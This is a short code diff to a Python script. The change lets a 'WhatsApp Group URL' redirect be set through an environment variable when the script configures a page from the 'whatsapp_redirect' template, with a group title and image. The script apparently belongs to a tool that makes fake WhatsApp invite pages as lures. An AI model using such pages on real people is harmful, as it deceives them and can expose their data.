@@ -11,6 +11,7 @@ W = '\033[0m'  # white
 
 title = os.getenv('TITLE')
 image = os.getenv('IMAGE')
+redirect = os.getenv('REDIRECT')
 
 if title is None:
     title = input(f'{G}[+] {C}Group Title : {W}')
@@ -22,6 +23,10 @@ if image is None:
 else:
     utils.print(f'{G}[+] {C}Group Image :{W} '+image)
 
+if redirect is None:
+    redirect = input(G + '[+]' + C + ' Enter WhatsApp Group URL : ' + W)
+else:
+    utils.print(f'{G}[+] {C}WhatsApp Group URL :{W} '+redirect)
 
 img_name = utils.downloadImageFromUrl(image, 'template/whatsapp_redirect/images/')
 if img_name :
@@ -34,7 +39,6 @@ else:
         utils.print('\n' + R + '[-]' + C + ' Exception : ' + W + str(e))
         exit()
 
-redirect = input(G + '[+]' + C + ' Enter WhatsApp Group URL : ' + W)
 with open('template/whatsapp_redirect/index_temp.html', 'r') as index_temp:
     code = index_temp.read()
     if os.getenv("DEBUG_HTTP"):
